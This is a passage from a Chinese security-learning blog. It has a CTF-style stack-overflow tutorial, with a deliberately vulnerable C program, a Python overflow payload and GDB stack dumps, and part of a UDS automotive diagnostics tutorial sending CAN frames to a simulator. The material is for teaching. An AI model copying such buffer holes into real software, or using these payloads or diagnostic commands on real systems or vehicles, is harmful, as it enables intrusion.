<li><p>来自 <a href="https://stackoverflow.com/questions/28693863/why-is-there-no-sub-rsp-instruction-in-this-function-prologue-and-why-are-func/31450406#31450406">stackoverflow</a> 的回答<br>The System V ABI for x86-64 specifies a <code>red zone</code> of 128 bytes below <code>%rsp</code>. These 128 bytes belong to the function as long as it doesn’t call any other function (it is a <em>leaf function</em>).<br>Signal handlers (and functions called by a debugger) need to respect the red zone, since they are effectively involuntary function calls.<br>All of the local variables of your <code>test_function</code>, which is a leaf function, fit into the red zone, thus no adjustment of <code>%rsp</code> is needed. (Also, the function has no visible side-effects and would be optimized out on any reasonable optimization setting).<br>You can compile with <code>-mno-red-zone</code> to stop the compiler from using space below the stack pointer. Kernel code has to do this because hardware interrupts don’t implement a red-zone.</p>
</li>
<li><p>另一个回答：<a href="https://stackoverflow.com/questions/13201644/why-does-the-x86-64-gcc-function-prologue-allocate-less-stack-than-the-local-var">https://stackoverflow.com/questions/13201644/why-does-the-x86-64-gcc-function-prologue-allocate-less-stack-than-the-local-var</a></p>
</li>
<li><p>《CTF权威指南PWN篇》第10章 P185 的解释<br>这是一项编译优化，rsp 以下 128 字节的区域被称为 red zone，是一块保留内存，不会被信号或中断所修改，函数可以在不调整栈指针的情况下用这块内存保存临时数据。</p>
</li>
</ul>

</details>


<details class="note info"><summary><p>📙扩展资料</p>
</summary>
<ul>
<li><a href="http://www.cnblogs.com/clover-toeic/p/3755401.html">C 语言函数调用栈 (一)</a></li>
<li><a href="http://www.cnblogs.com/clover-toeic/p/3756668.html">C 语言函数调用栈 (二)</a></li>
</ul>

</details>

<h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><p>转自 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">ctf-wiki</a>: </p>
<ul>
<li>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程</li>
<li>触发栈溢出的前提<ul>
<li>程序须往栈上写数据</li>
<li>写入的数据长度没有得到良好的控制</li>
</ul>
</li>
</ul>
<h3 id="可利用函数"><a href="#可利用函数" class="headerlink" title="可利用函数"></a>可利用函数</h3><p>想要写数据，就要先寻找能够读取用户输入的函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// linux系统调用 - read</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fildes, <span class="type">void</span> *buf, <span class="type">size_t</span> nbyte)</span>; <span class="comment">// example: read(0, buf, 0x10);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取一行数据 结束符: b&#x27;\n&#x27;</span></span><br><span class="line"><span class="type">char</span> * <span class="title function_">fgets</span><span class="params">(<span class="type">char</span> * <span class="keyword">restrict</span> str, <span class="type">int</span> size, FILE * <span class="keyword">restrict</span> stream)</span>;</span><br><span class="line"><span class="type">char</span> * <span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按照格式化字符串读数据, 常见的格式化字符串: %s</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">scanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> format, ...)</span>;  <span class="comment">// example: scanf(&quot;%s&quot;, buf);</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fscanf</span><span class="params">(FILE *<span class="keyword">restrict</span> stream, <span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sscanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串复制，遇到&#x27;\x00&#x27;停止</span></span><br><span class="line"><span class="type">char</span> * <span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> * dst, <span class="type">const</span> <span class="type">char</span> * src)</span>;</span><br><span class="line"><span class="type">char</span> * <span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> * dst, <span class="type">const</span> <span class="type">char</span> * src, <span class="type">size_t</span> len)</span>;</span><br><span class="line"><span class="comment">// 字符串拼接，遇到&#x27;\x00&#x27;停止</span></span><br><span class="line"><span class="type">char</span> * <span class="title function_">strcat</span><span class="params">(<span class="type">char</span> *<span class="keyword">restrict</span> s1, <span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s2)</span>;</span><br><span class="line"><span class="type">char</span> * <span class="title function_">strncat</span><span class="params">(<span class="type">char</span> *<span class="keyword">restrict</span> s1, <span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s2, <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>接下来通过一个简单的例子来介绍栈溢出：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// overflow.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">long</span> target = <span class="number">0xdeadbeef</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can say something:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (target == <span class="number">0x1234</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bingo!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc overflow.c -fno-stack-protector -o overflow</span></span><br></pre></td></tr></table></figure>

<details class="note success"><summary><p>📌gcc 编译参数里的 <code>-fno-stack-protector</code> 是用来干什么的？</p>
</summary>
<p>　　现在的GCC默认会启用栈保护机制，也就是<a href="Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6.md#Stack%20Canaries">Stack Canaries</a>, <code>-fno-stack-protector</code> 是用来关闭此保护机制的</p>

</details>


<p>思路</p>
<ol>
<li>程序中有一个大小为 <code>0x18</code> 的buf，但是可以读取 <code>0x20</code> 个字节的数据，存在栈溢出漏洞，可以覆盖掉紧邻 <code>buf</code> 的 <code>target</code> 变量</li>
<li>共输入 <code>0x20</code> 个字节的数据，前 <code>0x18</code> 个字节填充buf，后 <code>0x8</code> 个字节输入 <code>0x1234</code> 的字节流，覆盖掉 <code>target</code> 值即可成功进入 Bingo</li>
</ol>
<p>我们可以用 python 生成所需要输入的数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ python3 -c &quot;from struct import pack; print((b&#x27;A&#x27;*0x18 + pack(&#x27;&lt;Q&#x27;, 0x1234)).decode(), end=&#x27;&#x27;)&quot; | ./overflow</span><br><span class="line">You can say something:</span><br><span class="line">Bingo!</span><br></pre></td></tr></table></figure>

<p>GDB调试看一下 read 后的栈是什么状态：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb ./overflow</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b *vuln+60</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">r &lt;&lt;&lt; $(python3 -c <span class="string">&quot;from struct import pack; print((b&#x27;A&#x27;*0x18 + pack(&#x27;&lt;Q&#x27;, 0x1234)).decode(), end=&#x27;&#x27;)&quot;</span>)</span></span><br></pre></td></tr></table></figure>

<details class="note info"><summary><p>断点位置</p>
</summary>
<p>这里根据需要实际情况下断点，断点下在 <code>call read@plt</code> 之后，用来查看 read 之后的栈状态</p>
<ul>
<li>环境不同可能导致编译出来的程序不一致</li>
<li>可以先 <code>disass vuln</code> 查看一下</li>
</ul>

</details>


<p>python3-struct的使用:</p>
<ul>
<li><a href="https://docs.python.org/zh-cn/3/library/struct.html">struct — 将字节串解读为打包的二进制数据</a></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">───[ DISASM ]───</span><br><span class="line">   <span class="number">0x55555555518e</span> &lt;vuln+<span class="number">37</span>&gt;    mov    edx, <span class="number">0x20</span></span><br><span class="line">   <span class="number">0x555555555193</span> &lt;vuln+<span class="number">42</span>&gt;    mov    rsi, rax</span><br><span class="line">   <span class="number">0x555555555196</span> &lt;vuln+<span class="number">45</span>&gt;    mov    edi, <span class="number">0</span></span><br><span class="line">   <span class="number">0x55555555519b</span> &lt;vuln+<span class="number">50</span>&gt;    mov    eax, <span class="number">0</span></span><br><span class="line">   <span class="number">0x5555555551a0</span> &lt;vuln+<span class="number">55</span>&gt;    call   read@plt                &lt;read@plt&gt;</span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x5555555551a5</span> &lt;vuln+<span class="number">60</span>&gt;    cmp    qword ptr [rbp - <span class="number">8</span>], <span class="number">0x1234</span></span><br><span class="line">   <span class="number">0x5555555551ad</span> &lt;vuln+<span class="number">68</span>&gt;    jne    vuln+<span class="number">84</span>                &lt;vuln+<span class="number">84</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x5555555551af</span> &lt;vuln+<span class="number">70</span>&gt;    lea    rdi, [rip + <span class="number">0xe65</span>]</span><br><span class="line">   <span class="number">0x5555555551b6</span> &lt;vuln+<span class="number">77</span>&gt;    call   <span class="built_in">puts</span>@plt                &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x5555555551bb</span> &lt;vuln+<span class="number">82</span>&gt;    jmp    vuln+<span class="number">96</span>                &lt;vuln+<span class="number">96</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x5555555551bd</span> &lt;vuln+<span class="number">84</span>&gt;    lea    rdi, [rip + <span class="number">0xe5e</span>]</span><br><span class="line">──[ SOURCE (CODE) ]───</span><br><span class="line">In file: /home/ubuntu/Datas/learn/<span class="number">01</span>_ROP/src/overflow.c</span><br><span class="line">    <span class="number">3</span> 	<span class="type">char</span> buf[<span class="number">0x18</span>];</span><br><span class="line">    <span class="number">4</span> 	<span class="type">long</span> target = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="number">5</span></span><br><span class="line">    <span class="number">6</span> 	<span class="built_in">puts</span>(<span class="string">&quot;You can say something:&quot;</span>);</span><br><span class="line">    <span class="number">7</span> 	read(<span class="number">0</span>, buf, <span class="number">0x20</span>);</span><br><span class="line"> ►  <span class="number">8</span> 	<span class="keyword">if</span> (target == <span class="number">0x1234</span>) &#123;</span><br><span class="line">    <span class="number">9</span> 		<span class="built_in">puts</span>(<span class="string">&quot;Bingo!&quot;</span>);</span><br><span class="line">   <span class="number">10</span> 	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="number">11</span> 		<span class="built_in">puts</span>(<span class="string">&quot;Failed.&quot;</span>);</span><br><span class="line">   <span class="number">12</span> 	&#125;</span><br><span class="line">   <span class="number">13</span> &#125;</span><br><span class="line">──[ STACK ]───</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi rsp <span class="number">0x7fffffffe320</span> ◂— <span class="number">0x4141414141414141</span> (<span class="string">&#x27;AAAAAAAA&#x27;</span>)</span><br><span class="line">... ↓            <span class="number">2</span> skipped</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7fffffffe338</span> ◂— <span class="number">0x1234</span>   # 可以看到局部变量target已经被覆盖成了<span class="number">0x1234</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rbp     <span class="number">0x7fffffffe340</span> —▸ <span class="number">0x7fffffffe350</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7fffffffe348</span> —▸ <span class="number">0x5555555551de</span> (main+<span class="number">18</span>) ◂— mov    eax, <span class="number">0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0x7fffffffe350</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fffffffe358</span> —▸ <span class="number">0x7ffff7df0083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure>

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>栈溢出是一个特定的缓冲区溢出，通常情况下有这样的缓冲区溢出需求：</p>
<ol>
<li>栈溢出：覆盖特定的局部变量值(如上面的实例)</li>
<li>栈溢出：覆盖返回地址(构造ROP等, 下一节内容)</li>
<li>数据段溢出：覆盖特定的bss、data段的值</li>
<li>堆溢出：覆盖堆中的malloc_chunk的特定值(堆利用章节内容)</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>学习安全方向的必备能力</title>
    <url>/2023/07/19/start-learning/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="7b36af03dc5b938c98bf29a9783b2c6111ac82c6a1eb3ac5af327a616d7e7df1"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Security</category>
      </categories>
  </entry>
  <entry>
    <title>UDS 服务仿真实验</title>
    <url>/2024/07/12/uds-experiment-tutorial/</url>
    <content><![CDATA[<div class="note info"><p>👨‍💻 最近在 Github 上找到一个比较符合学习需求的 UDS 模拟器，拿来补充了一下，顺带搞个仿真实验教程。</p>
</div>

<h1 id="UDS-服务仿真实验"><a href="#UDS-服务仿真实验" class="headerlink" title="UDS 服务仿真实验"></a>UDS 服务仿真实验</h1><blockquote>
<p>参考资料：</p>
<ul>
<li><p><a href="https://www.canfd.net/uds.html">UDS协议</a></p>
</li>
<li><p><a href="https://blog.csdn.net/weixin_44522306/article/details/113104819">UDS(二)网络层</a></p>
</li>
<li><p><a href="https://www.canfd.net/udsreference.html">UDS快速参考手册</a></p>
</li>
<li><p><a href="https://blog.csdn.net/qq_40309666/article/details/130831416">《UDS协议从入门到精通（UDS速查手册）》（完结撒花版）</a></p>
<ul>
<li>写本文的时候这一系列还是都能免费看的，才过了没几天全变 VIP 文章了 😓【2024.07.23】</li>
</ul>
</li>
<li><p><a href="https://www.rafavi.com/index.php/en/training/automobile-communication-protocol/download/30_9fbe88c49894ef50341ba4aafe14abf1">ISO 14229-1</a></p>
</li>
</ul>
<p>📌 本文中的理论知识部分均摘自上述参考资料</p>
</blockquote>
<p>UDS：Unified Diagnostic Services，中文名称统一诊断服务，简称UDS。UDS协议是当前使用最为广泛的车载控制器诊断协议。UDS 既可应用于CAN总线，又可应用于以太网、LIN总线等。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li><p>本文测试使用系统：Ubuntu 22.04</p>
</li>
<li><p>本文实验所用模拟器：<a href="https://github.com/ex7l0it/uds-server-simulator">uds-server-simulator</a></p>
<ul>
<li>模拟应用于 CAN 总线上的 UDS 诊断协议</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装依赖环境</span></span><br><span class="line">sudo apt install can-utils</span><br><span class="line">pip3 install python-can</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用虚拟 can 接口</span></span><br><span class="line">sudo ip link add dev vcan0 type vcan</span><br><span class="line">sudo ip link set vcan0 up</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译模拟器</span></span><br><span class="line">git clone https://github.com/ex7l0it/uds-server-simulator</span><br><span class="line">cd ./uds-server-simulator &amp;&amp; make</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动模拟器(使用 config.json 中的 TBOX ECU配置)</span></span><br><span class="line">./uds-server-simulator -e TBOX vcan0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">另开终端会话，启动 candump 监听 can 通信数据</span></span><br><span class="line">candump vcan0</span><br></pre></td></tr></table></figure>



<h2 id="CAN-数据帧"><a href="#CAN-数据帧" class="headerlink" title="CAN 数据帧"></a>CAN 数据帧</h2><p>首先了解一下 CAN 数据帧结构：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture20240712155654.png" alt="摘自canfd.net"></p>
<table>
<thead>
<tr>
<th>简写</th>
<th>全称</th>
<th>中文含义</th>
</tr>
</thead>
<tbody><tr>
<td>N_PCIType</td>
<td>Network Protocol Control Information Type</td>
<td>网络层协议控制信息类型</td>
</tr>
<tr>
<td>SF_DL</td>
<td>Single Frame Data Length</td>
<td>单帧数据长度</td>
</tr>
<tr>
<td>N_Data</td>
<td>Network Layer Data</td>
<td>网络层数据</td>
</tr>
<tr>
<td>FF_DL</td>
<td>First Frame Data Length</td>
<td>首帧数据长度</td>
</tr>
<tr>
<td>SN</td>
<td>Sequence Number</td>
<td>序号</td>
</tr>
<tr>
<td>FS</td>
<td>Flow Status</td>
<td>流控帧状态</td>
</tr>
<tr>
<td>BS</td>
<td>Block Size</td>
<td>块大小（允许一次最大可发送连续帧数）</td>
</tr>
<tr>
<td>STmin</td>
<td>Separation Time Minium</td>
<td>最小间隔时间</td>
</tr>
<tr>
<td>CF</td>
<td>Consecutive Frame</td>
<td>连续帧、后续帧</td>
</tr>
</tbody></table>
<ul>
<li>N_PCIType &#x3D; 0 时，表示当前帧为单帧，首字节的低 4bit 代表当前帧后续的数据长度</li>
<li>N_PCIType &#x3D; 1 时，表示将要发送的数据不足以在单个帧中发送完毕，需要拆分，当前帧为首帧</li>
<li>N_PCIType &#x3D; 2 时，表示当前帧为拆分发送的数据，当前帧为连续帧，SN表示当前的帧序号</li>
<li>N_PCIType &#x3D; 3 时，表示当前帧为流控帧，能够调整 CF N_PDUs 发送速率</li>
</ul>
<h2 id="0x10-Diagnostic-Session-Control"><a href="#0x10-Diagnostic-Session-Control" class="headerlink" title="0x10 Diagnostic Session Control"></a>0x10 Diagnostic Session Control</h2><h3 id="服务简介"><a href="#服务简介" class="headerlink" title="服务简介"></a>服务简介</h3><p>诊断会话控制服务，SID: 0x10</p>
<p>该服务内容详解：<del><a href="https://blog.csdn.net/qq_40309666/article/details/133752052?spm=1001.2014.3001.5501">《UDS协议从入门到精通》系列——图解0x10：诊断会话控制</a></del></p>
<p>对应 ISO-14229-1 页码：36</p>
<p>UDS 协议中定义了三种会话模式，同一时间只能处于一种会话模式下，10 服务则用于切换会话模式：</p>
<ul>
<li>默认会话：上电默认进入的会话，在切换到任意非默认会话时，默认会话中的诊断功能同样可用</li>
<li>编程会话</li>
<li>扩展会话</li>
</ul>
<p>推荐的UDS诊断服务配置方式见下表（摘自canfd.net）：</p>
<table>
<thead>
<tr>
<th>SID(0X)</th>
<th>Service</th>
<th>默认会话</th>
<th>编程会话</th>
<th>扩展会话</th>
</tr>
</thead>
<tbody><tr>
<td>10</td>
<td>Diagnostic Session Control</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>11</td>
<td>ECU Reset</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>27</td>
<td>Security Access</td>
<td>-</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>28</td>
<td>Communication Control</td>
<td>-</td>
<td>-</td>
<td>Y</td>
</tr>
<tr>
<td>3E</td>
<td>Tester Present</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>85</td>
<td>Control DTC Setting</td>
<td>-</td>
<td>-</td>
<td>Y</td>
</tr>
<tr>
<td>22</td>
<td>Read Data By Identifier</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>2E</td>
<td>Write Data By Identifier</td>
<td>-</td>
<td>Y*</td>
<td>Y*</td>
</tr>
<tr>
<td>14</td>
<td>Clear Diagnostic Information</td>
<td>Y</td>
<td>-</td>
<td>Y</td>
</tr>
<tr>
<td>19</td>
<td>Read DTC Information</td>
<td>Y</td>
<td>-</td>
<td>Y</td>
</tr>
<tr>
<td>2F</td>
<td>Input Output Control By Identifier</td>
<td>-</td>
<td>-</td>
<td>Y*</td>
</tr>
<tr>
<td>31</td>
<td>Routine Control</td>
<td>-</td>
<td>-</td>
<td>Y*</td>
</tr>
<tr>
<td>34</td>
<td>Request Download</td>
<td>-</td>
<td>Y*</td>
<td>-</td>
</tr>
<tr>
<td>36</td>
<td>Transfer Data</td>
<td>-</td>
<td>Y*</td>
<td>-</td>
</tr>
<tr>
<td>37</td>
<td>Request Transfer Exit</td>
<td>-</td>
<td>Y*</td>
<td>-</td>
</tr>
</tbody></table>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture20240712155819.png" alt="ngt4n5mg.1dr"></p>
<ul>
<li>$x^a$：在默认会话模式中是否也允许0x86服务是特定于实现的，即不一定支持该服务；</li>
<li>$x^b$：如果是访问安全相关的DID则需基于安全访问服务，因此如果是该情况下要进非默认会话；</li>
<li>$x^c$：如果是访问安全相关的内存区域则需要安全访问服务，因此如果是该情况下要进非默认会话；</li>
<li>$x^d$：可以在默认和非默认会话中动态定义DID，因此非默认会话也支持这个服务；</li>
<li>$x^e$​：如果是安全相关例程需安全访问服务，因此需要非默认会话模式；需要客户端主动停止的例程也需要非默认会话模式。</li>
</ul>
<h3 id="请求-响应数据包分析"><a href="#请求-响应数据包分析" class="headerlink" title="请求 &#x2F; 响应数据包分析"></a>请求 &#x2F; 响应数据包分析</h3><p>使用 cansend 发送诊断会话控制请求，请求更改会话模式为扩展会话模式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cansend vcan0 733<span class="comment">#0210030000000000</span></span></span><br></pre></td></tr></table></figure>

<p>查看 candump 捕获到 vcan0 接口上的 can 报文数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vcan0  733   [8]  02 10 03 00 00 00 00 00</span><br><span class="line">vcan0  73B   [8]  06 50 03 00 32 01 F4 00</span><br></pre></td></tr></table></figure>

<p><strong>0x10 服务请求数据帧：</strong></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture20240715100416.jpg" alt="1720663353541"></p>
<p>Sub-Function 的 1 Byte 数据代表 SessionType:</p>
<table>
<thead>
<tr>
<th>SessionType</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>0x00</td>
<td>保留未使用</td>
</tr>
<tr>
<td>0x01</td>
<td>默认会话模式（Default Session），ECU上电后默认进入的模式，该模式无需 0x3E 服务进行维持</td>
</tr>
<tr>
<td>0x02</td>
<td>编程会话模式（Programming Session），主要用于 ECU 软件升级刷写</td>
</tr>
<tr>
<td>0x03</td>
<td>扩展会话模式（Extended Diagnostic Session），用于解锁需要高权限的诊断服务，基本覆盖各类服务（最常见的是读写 DID 前先进入扩展会话模式）</td>
</tr>
<tr>
<td>0x03</td>
<td>安全模式（Safety System Diagnostic Session），使能所有跟车载系统安全相关的服务（如安全气囊）</td>
</tr>
</tbody></table>
<blockquote>
<p>当前使用的 UDS 模拟器暂不支持 0x03 安全模式</p>
</blockquote>
<p><strong>0x10 服务肯定响应数据帧：</strong></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture20240715100428.jpg" alt="1720665925832"></p>
<ul>
<li>P2Server_max：表示 ECU 在收到请求与给出响应的时间间隔为 50 ms (0x32)</li>
<li>P2* Server_max<strong>：</strong>表示 ECU 发送 NRC 0x78 之后继续发送下帧诊断响应报文的时间间隔为 5000ms (0x01F4 * 10)</li>
</ul>
<p><strong>0x10 服务否定响应数据帧：</strong></p>
<ul>
<li>使用 cansend 发送一个长度为 3 Byte 的请求，得到否定响应：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vcan0  733   [8]  03 10 03 00 00 00 00 00</span><br><span class="line">vcan0  73B   [8]  03 7F 10 13 00 00 00 00</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202407171944295.jpg" alt="1720679290434"></p>
<p>可能出现的 NRC（否定响应码）：</p>
<table>
<thead>
<tr>
<th>NRC</th>
<th>描述</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>0x12</td>
<td>sub-functionNotSupported</td>
<td>子功能参数不受支持</td>
</tr>
<tr>
<td>0x13</td>
<td>incorrectMessageLengthOrInvalidFormat</td>
<td>消息长度错误</td>
</tr>
<tr>
<td>0x22</td>
<td>conditionsNotCorrect</td>
<td>不满足请求标准&#x2F;条件</td>
</tr>
</tbody></table>
<h2 id="0x22-ReadDataByIdentifier"><a href="#0x22-ReadDataByIdentifier" class="headerlink" title="0x22 ReadDataByIdentifier"></a>0x22 ReadDataByIdentifier</h2><h3 id="服务简介-1"><a href="#服务简介-1" class="headerlink" title="服务简介"></a>服务简介</h3><p>通过 ID 读数据，SID: 0x22</p>
<p>该服务内容详解：<del><a href="https://blog.csdn.net/qq_40309666/article/details/133888416?spm=1001.2014.3001.5501">《UDS协议从入门到精通》系列——图解0x22：通过ID读数据</a></del></p>
<p>对应 ISO-14229-1 页码：106</p>
<ul>
<li><p>DID：Data Identifier，数据标识符，能够用来标识数据的代号</p>
</li>
<li><p>22 服务能够查询指定 DID 对应的数据</p>
</li>
<li><p>ISO 14229-1 中 337 页的附录中定义了一部分 DID 含义，其中一些 常见的DID：</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>DID</th>
<th>描述</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>0xF180</td>
<td>BootSoftwareIdentificationDataIdentifier</td>
<td>ECU 引导软件标识</td>
</tr>
<tr>
<td>0xF187</td>
<td>vehicleManufacturerSparePartNumberDataIdentifier</td>
<td>备件编号</td>
</tr>
<tr>
<td>0xF18B</td>
<td>ECUManufacturingDateDataIdentifier</td>
<td>ECU 生产日期</td>
</tr>
<tr>
<td>0xF190</td>
<td>VINDataIdentifier</td>
<td>车辆 VIN 码</td>
</tr>
</tbody></table>
<h3 id="请求-响应数据包分析-1"><a href="#请求-响应数据包分析-1" class="headerlink" title="请求 &#x2F; 响应数据包分析"></a>请求 &#x2F; 响应数据包分析</h3><p>使用 cansend 发送请求读取 DID 为 0xF190 （VIN）的数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">cansend vcan0 733#0210030000000000</span><br><span class="line">cansend vcan0 733#0322F19000000000</span><br><span class="line">cansend vcan0 733#3000000000000000</span><br></pre></td></tr></table></figure>

<p>查看捕获到 的 can 报文数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">请求切换到扩展会话模式</span></span><br><span class="line">  vcan0  733   [8]  02 10 03 00 00 00 00 00</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确认切换到扩展会话模式</span></span><br><span class="line">  vcan0  73B   [8]  06 50 03 00 32 01 F4 00</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ReadDataByIdentifier:</span></span><br><span class="line">  vcan0  733   [8]  03 22 F1 90 00 00 00 00</span><br><span class="line">  vcan0  73B   [8]  10 14 62 F1 90 4C 55 41</span><br><span class="line">  vcan0  733   [8]  30 00 00 00 00 00 00 00</span><br><span class="line">  vcan0  73B   [8]  21 55 32 41 55 42 33 47</span><br><span class="line">  vcan0  73B   [8]  22 45 33 38 33 34 36 37</span><br></pre></td></tr></table></figure>

<p><strong>0x22 服务请求数据帧：</strong></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202407171944438.jpg" alt="1720677506735"></p>
<p>0x22 服务可以请求一个或多个DID（但实验所使用的 uds 模拟器暂不支持请求多个DID）</p>
<p>0x22 服务不支持 sub-function</p>
<p><strong>0x22 服务肯定响应数据帧（单个DID）：</strong></p>
<p>由于数据超出一个 CAN 帧能够携带的数据长度，需要分段发送，接收到一个分段数据的首帧：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202407171945237.jpg" alt="1720679348704"></p>
<p>发送流控帧，请求后续的数据：</p>
